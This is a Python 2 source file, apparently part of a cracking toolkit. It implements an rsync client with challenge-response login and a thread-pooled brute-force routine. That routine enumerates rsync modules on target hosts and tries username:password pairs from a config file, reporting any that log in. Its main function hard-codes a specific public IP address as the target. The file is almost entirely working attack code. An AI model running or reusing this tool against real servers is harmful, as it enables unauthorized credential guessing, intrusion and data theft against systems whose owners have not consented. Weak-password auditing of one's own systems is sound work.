# -*- coding: utf-8 -*-
import threading
import socket
# from printers import printPink,printRed,printGreen
from multiprocessing.dummy import Pool
socket.setdefaulttimeout(10)
import re
import time
import base64
try:
    import hashlib
    hash_md4 = hashlib.new("md4")
    hash_md5 = hashlib.md5()
except ImportError:
    # for Python << 2.5
    import md4
    import md5
    hash_md4 = md4.new()
    hash_md5 = md5.new()

# Import SOCKS module if it exists, else standard socket module socket
try:
    import SOCKS; socket = SOCKS; del SOCKS # import SOCKS as socket
    from socket import getfqdn; socket.getfqdn = getfqdn; del getfqdn
except ImportError:
    import socket
from socket import _GLOBAL_DEFAULT_TIMEOUT

__all__ = ["rsync"]



# The standard rsync server control port
RSYNC_PORT = 873
# The sizehint parameter passed to readline() calls
MAXLINE = 8192
protocol_version = 0

# Exception raised when an error or invalid response is received
class Error(Exception): pass

# All exceptions (hopefully) that may be raised here and that aren't
# (always) programming errors on our side
all_errors = (Error, IOError, EOFError)


# Line terminators for rsync
CRLF = '\r\n'
LF = '\n'

# The class itself
class rsync:
    '''An rsync client class.

    To create a connection, call the class using these arguments:
        host, module, user, passwd

    All arguments are strings, and have default value ''.
    Then use self.connect() with optional host and port argument.
    '''
    debugging = 0
    host = ''
    port = RSYNC_PORT
    maxline = MAXLINE
    sock = None
    file = None
    server_protocol_version = None

    # Initialization method (called by class instantiation).
    # Initialize host to localhost, port to standard rsync port
    # Optional arguments are host (for connect()),
    # and module, user, passwd (for login())
    def __init__(self, host='', module='', user='', passwd='',port=873,
                 timeout=_GLOBAL_DEFAULT_TIMEOUT):
        self.timeout = timeout
        if host:
            self.connect(host)
            if module and user and passwd:
                self.login(module, user, passwd)

    def connect(self, host='', port=0, timeout=-999):
        '''Connect to host.  Arguments are:
         - host: hostname to connect to (string, default previous host)
         - port: port to connect to (integer, default previous port)
        '''
        if host != '':
            self.host = host
        if port > 0:
            self.port = port
        if timeout != -999:
            self.timeout = timeout
        self.sock = socket.create_connection((self.host, self.port), self.timeout)
        self.af = self.sock.family
        self.file = self.sock.makefile('rb')
        self.server_protocol_version = self.getresp()
        self.protocol_version = self.server_protocol_version[-2:]
        return self.server_protocol_version


    def set_debuglevel(self, level):
        '''Set the debugging level.
        The required argument level means:
        0: no debugging output (default)
        1: print commands and responses but not body text etc.
        '''
        self.debugging = level
    debug = set_debuglevel

    # Internal: send one line to the server, appending LF
    def putline(self, line):
        line = line + LF
        if self.debugging > 1: print '*put*', line
        self.sock.sendall(line)

    # Internal: return one line from the server, stripping LF.
    # Raise EOFError if the connection is closed
    def getline(self):
        line = self.file.readline(self.maxline + 1)
        if len(line) > self.maxline:
            raise Error("got more than %d bytes" % self.maxline)
        if self.debugging > 1:
            print '*get*', line
        if not line: raise EOFError
        if line[-2:] == CRLF: line = line[:-2]
        elif line[-1:] in CRLF: line = line[:-1]
        return line

    # Internal: get a response from the server, which may possibly
    # consist of multiple lines.  Return a single string with no
    # trailing CRLF.  If the response consists of multiple lines,
    # these are separated by '\n' characters in the string
    def getmultiline(self):
        line = self.getline()
        return line

    # Internal: get a response from the server.
    # Raise various errors if the response indicates an error
    def getresp(self):
        resp = self.getmultiline()
        if self.debugging: print '*resp*', resp
        if resp.find('ERROR') != -1:
            raise Error, resp
        else:
            return resp

    def sendcmd(self, cmd):
        '''Send a command and return the response.'''
        self.putline(cmd)
        return self.getresp()

    def login(self, module='', user = '', passwd = ''):
        if not user: user = 'www'
        if not passwd: passwd = 'www'
        if not module: module = 'www'

        self.putline(self.server_protocol_version)
#        self.putline('@RSYNCD: 28.0')
#        self.protocol_version = 28
        resp = self.sendcmd(module)

        challenge = resp[resp.find('AUTHREQD ')+9:]

        if self.protocol_version >= 30:
            md5=hashlib.md5()
            md5.update(passwd)
            md5.update(challenge)
            hash = base64.b64encode(md5.digest())
        else:
            md4=hashlib.new('md4')
            tmp = '\0\0\0\0' + passwd + challenge
            md4.update(tmp)
            hash = base64.b64encode(md4.digest())

        response, number = re.subn(r'=+$','',hash)
        resp = self.sendcmd(user + ' ' + response)

        if resp.find('OK') == -1:
            raise Error, resp
        return resp

    def getModules(self):
        '''Get modules on the server'''
        print self.server_protocol_version
        self.putline(self.server_protocol_version)

        resp = self.sendcmd('')
        print resp
        return resp



    def close(self):
        '''Close the connection without assuming anything about it.'''
        self.putline('')
        if self.file is not None:
            self.file.close()
        if self.sock is not None:
            self.sock.close()
        self.file = self.sock = None




def get_ver(host):
    debugging = 0
    r = rsync(host)
    r.set_debuglevel(debugging)
    return r.server_protocol_version


def rsync_connect(ip,username,password,port):
    creak=0
    try:
        ver=get_ver(ip)# get rsync moudle
        fp = socket.create_connection((ip, port), timeout=8)
        fp.recv(99)

        fp.sendall(ver.strip('\r\n')+'\n')
        time.sleep(3)
        fp.sendall('\n')
        resp = fp.recv(99)

        modules = []
        for line in resp.split('\n'):
            modulename = line[:line.find(' ')]
            if modulename:
                if modulename !='@RSYNCD:':
                    modules.append(modulename)

        if len(modules)!=0:
            for modulename in modules:
                lock.acquire()
                print "find %s module in %s at %s" %(modulename,ip,port)
                lock.release()

                rs = rsync(ip)
                res = rs.login(module=modulename,user=username,passwd=password)
                if re.findall('.*OK.*',res):
                    rs.close()
                    creak=1
                if re.findall('.*Unknown.*',res):
                    creak=2
        else:
            creak=3

    except Exception,e:
        print e
        pass

    return creak


def rsync_creak(ip,port):
        try:
            d=open('conf/rsync.conf','r')
            data=d.readline().strip('\r\n')
            while(data):
                username=data.split(':')[0]
                password=data.split(':')[1]
                flag=rsync_connect(ip,username,password,port)

                if flag==3:
                    # lock.acquire()
                    print("fail!!bacaues can't find any module\r\n")
                    # lock.release()
                    break

                if flag==2:
                    # lock.acquire()
                    print("fail!!bacaues modulename is error\r\n")
                    # lock.release()
                    break

                if flag==1:
                    # lock.acquire()
                    print("%s rsync at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    result.append("%s rsync at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                    # lock.release()
                    break
                else:
                    # lock.acquire()
                    print "%s rsync service 's %s:%s login fail " %(ip,username,password)
                    # lock.release()
                data=d.readline().strip('\r\n')
        except Exception,e:
            print e


def rsync_main(ipdict,threads):
    print("crack rsync  now...")
    print "[*] start crack rsync  %s" % time.ctime()
    starttime=time.time()

    global lock
    lock = threading.Lock()
    global result
    result=[]

    pool=Pool(threads)

    for ip in ipdict['rsync']:
        pool.apply_async(func=rsync_creak,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
    pool.close()
    pool.join()

    print "[*] stop rsync serice  %s" % time.ctime()
    print "[*] crack rsync done,it has Elapsed time:%s " % (time.time()-starttime)
    return result

def main():
    rsync_creak('198.176.48.28',873)

if __name__ == '__main__':
    main()